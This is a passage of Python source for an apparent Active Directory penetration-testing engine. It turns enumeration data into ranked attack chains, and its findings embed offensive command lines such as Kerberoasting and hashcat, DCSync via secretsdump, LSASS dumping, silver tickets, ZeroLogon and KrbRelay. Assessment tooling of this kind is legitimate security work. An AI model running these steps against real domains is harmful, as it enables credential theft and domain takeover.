#!/usr/bin/env python3
"""Attack chain analysis engine."""
import hashlib
from collections import defaultdict
from bloodyomain.core import compute_cvss31, CVSS_SEVERITY_MAP, CVSS_SCORES

class AttackChainEngine:
    def __init__(self, data):
        self.data = data
        self.chains = []
        self._seen = set()

        self.privileged_groups = {"Domain Admins","Enterprise Admins","Schema Admins",
                                 "Administrators","DNSAdmins","Backup Operators",
                                 "Server Operators","Account Operators"}
        self.da_users = {
            a["member_name"].upper() for a in data.get("admins", [])
            if a.get("group") in ("Domain Admins","Enterprise Admins","Schema Admins")
        }
        for u in data.get("da_users", []):
            self.da_users.add(u.upper())

        self.privileged_users = set(self.da_users)
        for a in data.get("admins", []):
            if a.get("group") in self.privileged_groups:
                self.privileged_users.add(a["member_name"].upper())

        self.all_sessions = []
        for s in data.get("sessions", []) + data.get("loggedon", []):
            user = s.get("user","").split("\\")[-1].upper()
            host = (s.get("host_name") or s.get("host","")).split(".")[0].upper()
            if user and host:
                self.all_sessions.append({"user":user,"host":host,"stype":s.get("stype","")})

        self.local_admins = data.get("local_admins", [])
        self.rdp_access   = data.get("rdp_access", [])
        self.rdp_open_set = {h.split(".")[0].upper() for h in data.get("rdp_open", [])}
        self.dc_set = {c["name"].upper() for c in data.get("computers", []) if c.get("is_dc")}

    def _add(self, chain):
        if chain["id"] not in self._seen:
            self._seen.add(chain["id"]); self.chains.append(chain)

    def build(self):
        self._privileged_session_exposure()
        self._local_admin_to_da_session()
        self._rdp_to_da_session()
        self._kerberoast_chains()
        self._asrep_chains()
        self._delegation_chains()
        self._acl_chains()
        self._password_policy_risks()
        self._stale_accounts()
        self._nested_group_risks()
        self._machine_account_quota()
        self._rbcd_chains()
        self._adcs_chains()
        self._password_not_required_chains()
        self._admin_count_chains()
        self._password_never_expires_chains()
        self._shadow_creds_chains()
        self._gpo_write_chains()
        self._adminsd_chains()
        self._exchange_dcsync_chains()
        self._description_password_chains()  # Enum4linux-style description creds
        self._gpo_credential_chains()        # GPO/SYSVOL credential hunting
        self._validated_credential_chains()  # Tested valid credentials
        self._ou_acl_chains()               # OU container ACL abuse
        self._dns_admins_chains()           # DNSAdmins → DC SYSTEM
        self._cross_forest_chains()         # Forest trust abuse
        self._mssql_chains()                # MSSQL link/impersonation
        self._sccm_chains()                 # SCCM NAA / site server abuse
        self._laps_password_chains()        # LAPS password read + DA session
        # Extended attack chains (senior pentester additions)
        self._silver_ticket_chains()
        self._s4u_chains()
        self._krbrelay_chains()
        self._printnightmare_chains()
        self._zerologon_dcsync_chain()
        self._delegation_aware_chains()
        order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
        self.chains.sort(key=lambda c: order.get(c.get("severity","INFO"), 4))
        return self.chains

    def _privileged_session_exposure(self):
        for s in self.all_sessions:
            if s["user"] not in self.privileged_users: continue
            if s["host"] in self.dc_set: continue
            is_da = s["user"] in self.da_users
            self._add({
                "id": f"priv_sess_{s['user']}_{s['host']}",
                "type": "PRIVILEGED_SESSION_EXPOSURE",
                "severity": "CRITICAL" if is_da else "HIGH",
                "title": f"Privileged user session on non-DC: {s['host']}",
                "description": f"{s['user']} (privileged group) has an active {s['stype']} session on "
                               f"{s['host']}. Anyone with local admin there can dump creds.",
                "steps": [
                    f"Gain local admin on {s['host']}",
                    "Dump LSASS (Mimikatz sekurlsa::logonpasswords / secretsdump.py)",
                    f"Extract {s['user']} NTLM hash / TGT",
                    "Pass-the-Hash to DC → full domain compromise"
                ],
                "nodes": [s["user"], s["host"], "DOMAIN ADMIN"],
                "edges": [(s["host"], s["user"], "HasSession"),
                          (s["user"], "DOMAIN ADMIN", "MemberOf")]
            })

    def _local_admin_to_da_session(self):
        da_on_host = defaultdict(set)
        for s in self.all_sessions:
            if s["user"] in self.da_users:
                da_on_host[s["host"]].add(s["user"])

        for la in self.local_admins:
            user = la.get("user","")
            host = la.get("host","").split(".")[0].upper()
            if not user or not host: continue
            if user.upper() in self.da_users: continue
            if host not in da_on_host: continue
            das = sorted(da_on_host[host])
            self._add({
                "id": f"la_dasess_{user.upper()}_{host}",
                "type": "LOCAL_ADMIN_DA_SESSION", "severity": "CRITICAL",
                "title": f"Local admin → DA creds: {user} on {host}",
                "description": f"{user} has local admin on {host} where DA(s) "
                               f"{', '.join(das)} have active sessions.",
                "steps": [
                    f"Authenticate to {host} as {user}",
                    "Dump LSASS (requires SeDebugPrivilege)",
                    f"Extract NTLM hash of {das[0]}",
                    "Pass-the-Hash to DC → Domain Admin"
                ],
                "nodes": [user, host] + das + ["DOMAIN ADMIN"],
                "edges": [(user, host, "LocalAdmin"), (host, das[0], "HasSession"),
                          (das[0], "DOMAIN ADMIN", "MemberOf")]
            })

    def _rdp_to_da_session(self):
        da_on_host = defaultdict(set)
        for s in self.all_sessions:
            if s["user"] in self.da_users:
                da_on_host[s["host"]].add(s["user"])

        for rdp in self.rdp_access:
            user = rdp.get("user",""); host = rdp.get("host","").split(".")[0].upper()
            if not user or not host: continue
            if user.upper() in self.da_users: continue
            if host not in da_on_host: continue
            if host not in self.rdp_open_set: continue
            das = sorted(da_on_host[host])
            self._add({
                "id": f"rdp_dasess_{user.upper()}_{host}",
                "type": "RDP_TO_DA_SESSION", "severity": "HIGH",
                "title": f"RDP → DA session: {user} → {host}",
                "description": f"{user} can RDP to {host} (port 3389 open). "
                               f"DA(s) {', '.join(das)} have sessions there.",
                "steps": [
                    f"RDP to {host} as {user}",
                    "Escalate to SYSTEM (local exploit / token impersonation)",
                    f"Dump {das[0]} credentials from memory",
                    "Domain Admin access"
                ],
                "nodes": [user, host, das[0], "DOMAIN ADMIN"],
                "edges": [(user, host, "CanRDP"), (host, das[0], "HasSession"),
                          (das[0], "DOMAIN ADMIN", "MemberOf")]
            })

    def _kerberoast_chains(self):
        for spn in self.data.get("spns", []):
            user = spn.get("user","")
            is_da = user.upper() in self.da_users
            user_info = next((u for u in self.data.get("users", []) if u["name"] == user), None)
            risk_score = 0
            if user_info:
                if user_info.get("password_never_expires"):
                    risk_score += 3
                if user_info.get("admin_count", 0) > 0:
                    risk_score += 2
                pwd_days = user_info.get("pwd_last_set_days")
                if pwd_days and pwd_days > 180:
                    risk_score += 2
                elif pwd_days and pwd_days > 90:
                    risk_score += 1
            severity = "CRITICAL" if (is_da or risk_score >= 4) else "HIGH" if risk_score >= 2 else "MEDIUM"
            self._add({
                "id": f"kerb_{user.upper()}",
                "type": "KERBEROAST_DA" if is_da else "KERBEROAST",
                "severity": severity,
                "title": f"Kerberoastable{'  (DA!)' if is_da else ''}: {user} (score {risk_score})",
                "description": f"{user} has registered SPNs. " +
                    ("This is a Domain Admin — direct compromise path." if is_da
                     else f"Crack the TGS hash offline. Risk score: {risk_score}."),
                "steps": [
                    "GetUserSPNs.py <domain>/<user> -dc-ip <DC> -request -outputfile hashes.txt",
                    "hashcat -m 13100 hashes.txt wordlist.txt --rules=best64.rule",
                    f"Authenticate as {user}" + (" → Domain Admin" if is_da else "")
                ],
                "nodes": [user, "KERBEROAST"] + (["DOMAIN ADMIN"] if is_da else []),
                "edges": [(user, "KERBEROAST", "Kerberoastable")]
            })

    def _asrep_chains(self):
        for user in self.data.get("asrep", []):
            is_da = user.upper() in self.da_users
            self._add({
                "id": f"asrep_{user.upper()}",
                "type": "ASREP_ROAST",
                "severity": "CRITICAL" if is_da else "HIGH",
                "title": f"AS-REP Roastable{'  (DA!)' if is_da else ''}: {user}",
                "description": f"{user} has DONT_REQUIRE_PREAUTH set — hash can be "
                               "captured without any credentials.",
                "steps": [
                    "GetNPUsers.py -no-pass -usersfile users.txt -dc-ip <DC> <domain>/",
                    "hashcat -m 18200 asrep.txt wordlist.txt",
                    f"Credentials for {user}" + (" → Domain Admin" if is_da else "")
                ],
                "nodes": [user, "ASREP-ROAST"],
                "edges": [(user, "ASREP-ROAST", "ASREPRoastable")]
            })

    def _delegation_chains(self):
        for comp in self.data.get("computers", []):
            if not comp.get("trusted_for_delegation") or comp.get("is_dc"):
                continue
            self._add({
                "id": f"uncdeleg_{comp['name'].upper()}",
                "type": "UNCONSTRAINED_DELEGATION", "severity": "HIGH",
                "title": f"Unconstrained delegation: {comp['name']}",
                "description": f"{comp['name']} caches TGTs of authenticating users. "
                               "Coercing a DA to authenticate yields its TGT.",
                "steps": [
                    f"Compromise {comp['name']} (local admin)",
                    "Rubeus.exe monitor /targetuser:krbtgt /interval:5 /nowrap",
                    f"Coerce DC auth: PetitPotam.py / SpoolSample → {comp['name']}",
                    "Inject captured DA TGT (Rubeus ptt) → DCSync"
                ],
                "nodes": [comp["name"], "UNCONSTRAINED DELEGATION", "DOMAIN ADMIN"],
                "edges": [(comp["name"], "UNCONSTRAINED DELEGATION", "TrustedFor")]
            })
        for user in self.data.get("users", []):
            if user.get("trusted_for_delegation") and user.get("enabled"):
                self._add({
                    "id": f"userdeleg_{user['name'].upper()}",
                    "type": "USER_DELEGATION", "severity": "MEDIUM",
                    "title": f"User with delegation: {user['name']}",
                    "description": f"{user['name']} is trusted for delegation — "
                                   "S4U2Self/S4U2Proxy ticket abuse possible.",
                    "steps": [
                        f"Compromise {user['name']} credentials",
                        "S4U2Self → forge TGS for any user to this account's SPNs",
                        "S4U2Proxy → forward ticket to target service"
                    ],
                    "nodes": [user["name"], "DELEGATION"],
                    "edges": [(user["name"], "DELEGATION", "TrustedFor")]
                })

    def _acl_chains(self):
        for ace in self.data.get("acl_edges", []):
            sev = ace.get("severity","HIGH")
            if sev not in ("CRITICAL","HIGH"): continue
            src, tgt, right = ace.get("source",""), ace.get("target",""), ace.get("right","")
            steps = {
                "GenericAll": [f"Compromise {src}",
                               f"Reset {tgt} password (Set-ADAccountPassword)",
                               f"Authenticate as {tgt}"],
                "WriteDACL": [f"Compromise {src}",
                              f"Modify DACL on {tgt}: grant GenericAll to {src} (Add-DomainObjectAcl)",
                              f"If {tgt} is domain: grant DCSync → secretsdump.py -just-dc",
                              f"If {tgt} is user/group: reset password or modify group membership"],

                "WriteOwner": [f"Compromise {src}",
                               f"Take ownership of {tgt} (Set-DomainObjectOwner)",
                               "Grant GenericAll, then reset password / DCSync"],
                "ForceChangePassword": [f"Compromise {src}",
                                       f"Set-DomainUserPassword -Identity {tgt}",
                                       f"Authenticate as {tgt}"],
                "DS-Replication-Get-Changes-All": [f"Compromise {src}",
                                       f"secretsdump.py '{src}@<DC>' -just-dc",
                                       "Extract krbtgt → Golden Ticket"],
            }.get(right, [f"Compromise {src}", f"Abuse {right} over {tgt}",
                          f"Take control of {tgt}"])
            self._add({
                "id": f"acl_{src.upper()}_{tgt.upper()}_{right}",
                "type": "ACL_ABUSE", "severity": sev,
                "title": f"ACL: {src} → {right} → {tgt}",
                "description": ace.get("description", f"{src} has {right} over {tgt}"),
                "steps": steps,
                "nodes": [src, tgt],
                "edges": [(src, tgt, right)]
            })

    def _password_policy_risks(self):
        dom = self.data.get("domain", {})
        thr = int(dom.get("lockout_threshold",0) or 0)
        ml  = int(dom.get("min_pwd_length",0) or 0)
        obs = int(dom.get("lockout_window_min",0) or 0)
        dur = int(dom.get("lockout_duration_min",0) or 0)

        if thr == 0:
            self._add({
                "id":"policy_no_lockout","type":"PASSWORD_POLICY","severity":"HIGH",
                "title":"No account lockout policy",
                "description":"No lockout threshold — password spraying possible "
                              "without locking accounts.",
                "steps":[
                    "Enumerate usernames (kerbrute userenum / RID cycling)",
                    "Spray common passwords (kerbrute passwordspray)",
                    "No lockout = unlimited attempts"
                ],
                "nodes":["PASSWORD SPRAY","DOMAIN ADMIN"],
                "edges":[("PASSWORD SPRAY","DOMAIN ADMIN","PotentialPath")]
            })
        elif 1 <= thr <= 5:
            safe = max(1, thr - 1)  # DÜZELTME: thr=1 iken safe=0 olmamali
            self._add({
                "id":"policy_low_lockout","type":"PASSWORD_POLICY","severity":"MEDIUM",
                "title":f"Low lockout threshold ({thr}) — spray window {safe} attempts",
                "description":f"Lockout after {thr} failures — up to {safe} "
                              f"spray attempts per observation window ({obs} min). "
                              f"Account resets after {dur} min.",
                "steps":[f"Spray {safe} passwords per account per cycle, with delay/jitter",
                        "Common targets: Password1, Welcome1, Season+Year"],
                "nodes":["PASSWORD SPRAY"], "edges":[]
            })

        if 0 < ml <= 8:
            self._add({
                "id":"policy_short_pwd","type":"PASSWORD_POLICY","severity":"MEDIUM",
                "title":f"Weak min password length: {ml}",
                "description":f"Min length {ml} chars — short hashes crack fast offline.",
                "steps":["Dump NTLM hashes (secretsdump.py)",
                        f"hashcat -m 1000 -a 3 mask matching {ml}-char space"],
                "nodes":[], "edges":[]
            })

    def _stale_accounts(self):
        for user in self.data.get("users", []):
            if not user.get("enabled"): continue
            last = user.get("last_logon_days")
            name = user.get("name","")
            is_da = name.upper() in self.da_users
            # Hic giris yapmamis hesaplar (last_logon_days is None)
            if last is None:
                self._add({
                    "id": f"never_logon_{name.upper()}",
                    "type": "NEVER_LOGGED_ON",
                    "severity": "HIGH" if is_da else "MEDIUM",
                    "title": f"Account never logged in: {name}" + (" (DA!)" if is_da else ""),
                    "description": f"{name} is enabled but has never logged on. "
                                   "Often created with a default password that was never changed.",
                    "steps": [f"Try default/initial password for {name}",
                             "Check if account was recently created",
                             "Domain Admin if compromised!" if is_da else "Use for lateral movement"],
                    "nodes": [name], "edges": []
                })
            elif last > 90:
                self._add({
                    "id": f"stale_{name.upper()}",
                    "type": "STALE_ACCOUNT",
                    "severity": "HIGH" if is_da else "MEDIUM",
                    "title": f"Stale enabled account: {name} ({last}d inactive)",
                    "description": f"{name} enabled but inactive {last} days — "
                                   "often forgotten, may have weak/unrotated password.",
                    "steps": [f"Try common/default passwords for {name}",
                             "Check password expiry / policy exemption",
                             "Domain Admin if compromised!" if is_da else "Use for lateral movement"],
                    "nodes": [name], "edges": []
                })

    def _nested_group_risks(self):
        priv = {"Domain Admins","Enterprise Admins","Schema Admins",
               "Backup Operators","Account Operators","Server Operators","Print Operators"}
        for group, members in self.data.get("nested_memberships", {}).items():
            if group not in priv: continue
            for member in members:
                if member.upper() in self.da_users: continue
                is_svc = any(k in member.lower() for k in ('svc','service','sql','iis','web','app'))
                self._add({
                    "id": f"nested_{group.replace(' ','_')}_{member.upper()}",
                    "type": "NESTED_GROUP_PRIVILEGE",
                    "severity": "HIGH" if is_svc else "MEDIUM",
                    "title": f"Nested privilege: {member} → {group}",
                    "description": f"{member} reaches {group} via nested membership. " +
                        ("Service account with admin rights — high-value target."
                         if is_svc else "Review if intentional."),
                    "steps": [f"Compromise {member}", "whoami /groups (verify effective rights)",
                             f"Exploit {group} privileges"],
                    "nodes": [member, group],
                    "edges": [(member, group, "NestedMemberOf")]
                })

    def _machine_account_quota(self):
        quota = self.data.get("domain", {}).get("machine_account_quota", 0)
        if quota > 0:
            self._add({
                "id": "machine_quota_abuse",
                "type": "MACHINE_ACCOUNT_QUOTA",
                "severity": "HIGH",
                "title": f"MachineAccountQuota = {quota} — possible RBCD/Shadow Credentials abuse",
                "description": f"Users can join up to {quota} computers to the domain. "
                               "This can be abused for Resource-Based Constrained Delegation (RBCD) "
                               "or Shadow Credentials attacks.",
                "steps": [
                    "Add a computer account: addcomputer.py -method LDAPS ...",
                    "Set RBCD: Set-ADComputer <target> -PrincipalsAllowedToDelegateToAccount <newcomp>$",
                    "S4U2Self/S4U2Proxy -> compromise target"
                ],
                "nodes": ["MACHINE_ACCOUNT_QUOTA", "DOMAIN ADMIN"],
                "edges": [("MACHINE_ACCOUNT_QUOTA", "DOMAIN ADMIN", "PotentialPath")]
            })

    def _rbcd_chains(self):
        for comp in self.data.get("computers", []):
            rbcd = comp.get("rbcd")
            if not rbcd or comp.get("is_dc"): continue
            for sid in rbcd:
                self._add({
                    "id": f"rbcd_{comp['name'].upper()}_{sid}",
                    "type": "RBCD",
                    "severity": "HIGH",
                    "title": f"RBCD on {comp['name']} allowed to SID {sid}",
                    "description": f"{comp['name']} has msDS-AllowedToActOnBehalfOfOtherIdentity "
                                   f"allowing SID {sid} to delegate.",
                    "steps": [
                        "Compromise account with SID",
                        "S4U2Self/S4U2Proxy to impersonate any user on target",
                        "DCSync / Admin access"
                    ],
                    "nodes": [comp["name"], "RBCD"],
                    "edges": [(comp["name"], "RBCD", "HasRBCD")]
                })

    def _adcs_chains(self):
        for esc in self.data.get("adcs_esc", []):
            self._add({
                "id": f"adcs_{esc['id']}",
                "type": "ADCS_ESC",
                "severity": esc.get("severity", "HIGH"),
                "title": f"ADCS ESC{esc['id']}: {esc['template']}",
                "description": esc.get("description", ""),
                "steps": esc.get("steps", []),
                "nodes": ["ADCS", esc.get("template", "TEMPLATE")],
                "edges": [("ADCS", esc.get("template", "TEMPLATE"), "Vulnerable")]
            })

    def _password_not_required_chains(self):
        for user in self.data.get("users", []):
            if user.get("password_not_required") and user.get("enabled"):
                name = user["name"]
                self._add({
                    "id": f"pwdnotreq_{name.upper()}",
                    "type": "PASSWORD_NOT_REQUIRED",
                    "severity": "HIGH",
                    "title": f"Password not required for {name}",
                    "description": f"{name} has 'password_not_required' set. This is a serious misconfiguration.",
                    "steps": [
                        f"Try to authenticate to services as {name} without password",
                        "Check for weak/default passwords",
                        "Use for lateral movement"
                    ],
                    "nodes": [name],
                    "edges": []
                })

    def _admin_count_chains(self):
        for user in self.data.get("users", []):
            if user.get("admin_count", 0) > 0 and user.get("enabled"):
                name = user["name"]
                if name.upper() in self.da_users: continue
                self._add({
                    "id": f"admincount_{name.upper()}",
                    "type": "ADMIN_COUNT_1",
                    "severity": "HIGH",
                    "title": f"AdminCount=1 for {name} (non-DA)",
                    "description": f"{name} has AdminCount=1 meaning it was once a protected group member. "
                                   "It may still have elevated privileges.",
                    "steps": [
                        f"Enumerate effective rights of {name}",
                        "Check group memberships (may have residual privileges)",
                        "Use for lateral movement"
                    ],
                    "nodes": [name],
                    "edges": []
                })

    def _password_never_expires_chains(self):
        for user in self.data.get("users", []):
            if user.get("password_never_expires") and user.get("enabled"):
                name = user["name"]
                is_da = name.upper() in self.da_users
                self._add({
                    "id": f"pwdnever_{name.upper()}",
                    "type": "PASSWORD_NEVER_EXPIRES",
                    "severity": "CRITICAL" if is_da else "HIGH",
                    "title": f"Password never expires for {name}" + (" (DA!)" if is_da else ""),
                    "description": f"{name} has password_never_expires set. This increases the risk of "
                                   "credential compromise over time.",
                    "steps": [
                        "Try to obtain hash (Kerberoast, AS-REP, DCSync)",
                        "If compromised, the account remains valid forever"
                    ],
                    "nodes": [name],
                    "edges": []
                })

    def _shadow_creds_chains(self):
        for cred in self.data.get("shadow_creds", []):
            user = cred.get("user")
            if user and user.upper() in self.da_users:
                self._add({
                    "id": f"shadow_da_{user.upper()}",
                    "type": "SHADOW_CREDENTIALS",
                    "severity": "CRITICAL",
                    "title": f"Shadow Credentials on DA: {user}",
                    "description": "msDS-KeyCredentialLink set. Allows PKINIT authentication without password.",
                    "steps": ["Use Wh4tSh0t / PKINIT to get TGT", "DCSync"],
                    "nodes": [user, "DOMAIN ADMIN"],
                    "edges": [(user, "DOMAIN ADMIN", "ShadowCreds")]
                })

    def _gpo_write_chains(self):
        for gpo in self.data.get("gpo_write_perms", []):
            user = gpo.get("user")
            gpo_name = gpo.get("gpo")
            if user and not user.upper() in self.da_users:
                self._add({
                    "id": f"gpowrite_{user.upper()}_{gpo_name}",
                    "type": "GPO_WRITE",
                    "severity": "CRITICAL",
                    "title": f"{user} can write to GPO: {gpo_name}",
                    "description": "Writing to GPO allows immediate code execution on all linked computers.",
                    "steps": ["Add a malicious startup script to the GPO", "Wait for next refresh", "Get SYSTEM"],
                    "nodes": [user, gpo_name, "DOMAIN ADMIN"],
                    "edges": [(user, gpo_name, "WriteGPO")]
                })

    def _adminsd_chains(self):
        for entry in self.data.get("adminsd_acl", []):
            if entry.get("right") in ["GenericAll", "WriteDACL", "WriteOwner"]:
                self._add({
                    "id": f"adminsd_{entry['user']}",
                    "type": "ADMINSD_BACKDOOR",
                    "severity": "CRITICAL",
                    "title": f"AdminSDHolder permissions: {entry['user']} -> {entry['right']}",
                    "description": "AdminSDHolder DACL modified. The user may regain DA privileges after 60 min.",
                    "steps": ["Wait for SDProp to apply", "Get DA"],
                    "nodes": [entry['user'], "DOMAIN ADMIN"],
                    "edges": [(entry['user'], "DOMAIN ADMIN", "AdminSDHolder")]
                })

    def _silver_ticket_chains(self):
        """Silver Ticket: SPN sahibi servis hesabi kirilirsa TGS forge."""
        for c in self.data.get("computers", []):
            spns = c.get("spns", [])
            if not spns: continue
            for spn in spns:
                # Silver tickets can be forged for many service classes beyond just HOST/CIFS/HTTP
                SILVER_TICKET_SPNS = {"HOST", "CIFS", "HTTP", "LDAP", "MSSQLSVC", "TERMSRV",
                                      "WINRM", "WSMAN", "RPCSS", "WSMAN", "FRS", "DFS",
                                      "NETLOGON", "SAMR", "BROWSER", "EVENTLOG"}
                spn_service = spn.split("/")[0].upper() if "/" in spn else ""
                if spn_service in SILVER_TICKET_SPNS:
                    self._add({
                        "id": f"silver_{c['name'].upper()}_{spn[:30]}",
                        "type": "SILVER_TICKET",
                        "severity": "HIGH",
                        "title": f"Silver Ticket target: {c['name']} ({spn})",
                        "description": f"Compromise {c['name']} machine account -> forge TGS for {spn}.",
                        "steps": [
                            f"Obtain {c['name']}$ NTLM hash (DCSync / kerberoast)",
                            f"ticketer.py -nthash <hash> -domain-sid <SID> -spn {spn} administrator",
                            f"Access {c['name']} as DA via silver ticket"
                        ],
                        "nodes": [c["name"], "SILVER TICKET"],
                        "edges": [(c["name"], "SILVER TICKET", "SilverTicket")]
                    })

    def _s4u_chains(self):
        """S4U2Self/S4U2Proxy: Constrained delegation + RBCD kombinasyon zinciri."""
        for c in self.data.get("computers", []):
            targets = c.get("constrained_targets", [])
            rbcd = c.get("rbcd")
            if not targets and not rbcd: continue
            for tgt in targets:
                self._add({
                    "id": f"s4u_{c['name'].upper()}_{tgt.upper()}",
                    "type": "S4U2PROXY",
                    "severity": "HIGH",
                    "title": f"S4U2Proxy: {c['name']} -> {tgt}",
                    "description": f"{c['name']} can delegate to {tgt} via constrained delegation.",
                    "steps": [
                        f"Compromise {c['name']}$ machine account",
                        "S4U2Self -> TGS for administrator", f"S4U2Proxy -> forward to {tgt}"
                    ],
                    "nodes": [c["name"], tgt, "DOMAIN ADMIN"],
                    "edges": [(c["name"], tgt, "S4U2Proxy")]
                })
            if rbcd:
                for sid in rbcd:
                    self._add({
                        "id": f"s4u_rbcd_{c['name'].upper()}_{str(sid)[:20]}",
                        "type": "RBCD_S4U",
                        "severity": "HIGH",
                        "title": f"RBCD S4U: {sid} -> {c['name']}",
                        "description": f"SID {sid} can delegate to {c['name']} via RBCD.",
                        "steps": ["Control SID principal", "S4U2Self + S4U2Proxy -> target compromise"],
                        "nodes": [str(sid), c["name"]],
                        "edges": [(str(sid), c["name"], "AllowedToDelegate")]
                    })

    def _krbrelay_chains(self):
        """KrbRelay: LDAP signing kapali -> RBCD abuse."""
        ldap_sec = self.data.get("ldap_security", {})
        if ldap_sec.get("signing_enforced") is not False:
            return
        rbcd_targets = [c for c in self.data.get("computers", [])
                        if c.get("rbcd") and not c.get("is_dc") and c.get("enabled")]
        for c in rbcd_targets:
            self._add({
                "id": f"krbrelay_{c['name'].upper()}",
                "type": "KRBRELAY",
                "severity": "CRITICAL",
                "title": f"KrbRelay: LDAP signing OFF -> RBCD on {c['name']}",
                "description": f"LDAP signing not enforced + RBCD on {c['name']}. KrbRelay -> DCSync.",
                "steps": [
                    f"KrbRelay.exe -spn LDAP/<DC> -clsid <CLSID> -add-rbcd {c['name']}$",
                    f"S4U2Self + S4U2Proxy to {c['name']} -> DCSync"
                ],
                "nodes": ["KRBRELAY", c["name"], "DOMAIN ADMIN"],
                "edges": [("KRBRELAY", c["name"], "KrbRelay"), (c["name"], "DOMAIN ADMIN", "DCSync")]
            })

    def _printnightmare_chains(self):
        """PrintNightmare (CVE-2021-34527): Spooler -> RCE -> DA session dump."""
        spooler_hosts = self.data.get("vuln_scan", {}).get("spooler", [])
        if not spooler_hosts: return
        da_on_spooler = {}
        for s in self.all_sessions:
            if s["user"] in self.da_users:
                h = s["host"].upper()
                da_on_spooler.setdefault(h, set()).add(s["user"])
        for host in spooler_hosts:
            das = sorted(da_on_spooler.get(host.upper(), []))
            sev = "CRITICAL" if das else "HIGH"
            self._add({
                "id": f"printnightmare_{host.upper()}",
                "type": "PRINTNIGHTMARE",
                "severity": sev,
                "title": f"PrintNightmare: Spooler on {host}" + (f" + DA: {','.join(das)}" if das else ""),
                "description": "CVE-2021-34527: Spooler RCE -> SYSTEM." +
                               (f" DA sessions on host -> direct DA compromise!" if das else ""),
                "steps": [
                    f"impacket-rpcdump {host} | grep MS-RPRN",
                    "CVE-2021-34527 exploit -> SYSTEM shell",
                    "Dump LSASS" + (" -> DA hash extraction" if das else "")
                ],
                "nodes": [host, "PRINTNIGHTMARE"] + (["DOMAIN ADMIN"] if das else []),
                "edges": [(host, "PRINTNIGHTMARE", "PrintNightmare")]
            })

    def _zerologon_dcsync_chain(self):
        """ZeroLogon -> DCSync otomatik zincir."""
        zl_hosts = self.data.get("vuln_scan", {}).get("zerologon", [])
        for host in zl_hosts:
            self._add({
                "id": f"zerologon_dcsync_{host.upper()}",
                "type": "ZEROLOGON_DCSYNC",
                "severity": "CRITICAL",
                "title": f"ZeroLogon -> DCSync: {host} -> krbtgt -> Golden Ticket",
                "description": f"CVE-2020-1472: {host} DC password sifirlanabilir -> DCSync -> krbtgt.",
                "steps": [
                    f"cve-2020-1472-exploit.py {host} <NETBIOS_NAME>",
                    f"secretsdump.py -just-dc -no-pass {host}$@{host}",
                    "krbtgt hash -> Golden Ticket -> full forest compromise"
                ],
                "nodes": [host, "ZEROLOGON", "DOMAIN ADMIN"],
                "edges": [(host, "ZEROLOGON", "ZeroLogon"), ("ZEROLOGON", "DOMAIN ADMIN", "DCSync")]
            })

    def _delegation_aware_chains(self):
        """Delegasyon + Shadow Creds + LAPS -> DA zincirleri."""
        da_set = self.da_users
        # Shadow Creds -> DA PKINIT
        for sc in self.data.get("shadow_creds", []):
            user = sc.get("user", "")
            is_da = user.upper().rstrip("$") in da_set
            if is_da:
                self._add({
                    "id": f"shadow_da_{user.upper()}",
                    "type": "SHADOW_CRED_DA",
                    "severity": "CRITICAL",
                    "title": f"Shadow Creds on DA: {user} -> PKINIT -> TGT",
                    "description": f"{user} msDS-KeyCredentialLink -> PKINIT auth without password.",
                    "steps": ["certipy shadow auto -account <target>", "PKINIT -> DA TGT"],
                    "nodes": [user, "SHADOW CREDS", "DOMAIN ADMIN"],
                    "edges": [(user, "SHADOW CREDS", "ShadowCreds")]
                })
        # LAPS reader -> local admin -> DA session
        for lr in self.data.get("laps_readers", []):
            reader, computer = lr.get("reader",""), lr.get("computer","")
            da_here = [s["user"] for s in self.all_sessions
                       if s["host"].upper() == computer.upper() and s["user"].upper() in da_set]
            if da_here:
                self._add({
                    "id": f"laps_to_da_{reader.upper()}_{computer.upper()}",
                    "type": "LAPS_TO_DA_CHAIN",
                    "severity": "CRITICAL",
                    "title": f"LAPS chain: {reader} -> {computer}(LAPS) -> DA({da_here[0]})",
                    "description": f"{reader} reads LAPS on {computer}. DA session -> credential dump.",
                    "steps": [
                        f"Get-ADComputer {computer} -Properties msLAPS-Password",
                        f"Local admin to {computer}", f"Dump LSASS -> {da_here[0]} -> DA"
                    ],
                    "nodes": [reader, computer, da_here[0], "DOMAIN ADMIN"],
                    "edges": [(reader, computer, "LAPS_Read"), (computer, da_here[0], "HasSession")]
                })
        # Constrained delegation -> DA session hedef
        for c in self.data.get("computers", []):
            if not c.get("constrained_targets"): continue
            for tgt in c.get("constrained_targets", []):
                tgt_upper = tgt.upper()
                da_here = [s["user"] for s in self.all_sessions
                           if s["host"].upper() == tgt_upper and s["user"].upper() in da_set]
                if da_here:
                    self._add({
                        "id": f"const_del_to_da_{c['name'].upper()}_{tgt_upper}",
                        "type": "CONSTRAINED_TO_DA",
                        "severity": "CRITICAL",
                        "title": f"Constrained delegation -> DA: {c['name']} -> {tgt} (DA sessions)",
                        "description": f"{c['name']} -> {tgt}. DA(s) {','.join(da_here)} have sessions on target.",
                        "steps": [
                            f"Compromise {c['name']}$ machine account",
                            f"S4U2Self -> administrator TGS to {c['name']}",
                            f"S4U2Proxy -> forward to {tgt}",
                            f"Dump LSASS -> extract DA credentials"
                        ],
                        "nodes": [c["name"], tgt, "DOMAIN ADMIN"],
                        "edges": [(c["name"], tgt, "S4U2Proxy"), (tgt, "DOMAIN ADMIN", "HasSession")]
                    })

    def _exchange_dcsync_chains(self):
        for exch in self.data.get("exchange_dcsync", []):
            user = exch.get("user")
            self._add({
                "id": f"exchange_dcsync_{user.upper()}",
                "type": "EXCHANGE_DCSYNC",
                "severity": "CRITICAL",
                "title": f"Exchange DCSync: {user} has DCSync rights",
                "description": "Exchange Trusted Subsystem often gets DCSync. Abuse to dump hashes.",
                "steps": ["secretsdump.py -just-dc"],
                "nodes": [user, "DOMAIN ADMIN"],
                "edges": [(user, "DOMAIN ADMIN", "DCSync")]
            })

    def _description_password_chains(self):
        """Enum4linux/ldapdomaindump-style: credentials found in user description fields."""
        desc_findings = self.data.get("description_passwords", [])
        if not desc_findings:
            return

        high_conf_types = {"label", "initial", "full_creds", "changed", "creds_kv", "base64"}
        med_conf_types = {"sentence", "userpass", "account_info", "simple_label", "code"}

        for f in desc_findings:
            ptype = f.get("pattern_type", "?")
            cred = f.get("found_credential", "???")
            username = f.get("found_username", "")
            user = f["user"]
            desc_snippet = f.get("match", cred)[:80]

            if ptype in high_conf_types:
                severity = "CRITICAL"
            elif ptype in med_conf_types:
                severity = "HIGH"
            elif ptype == "heuristic":
                severity = "MEDIUM"
            else:
                severity = "MEDIUM"

            # Build descriptive title
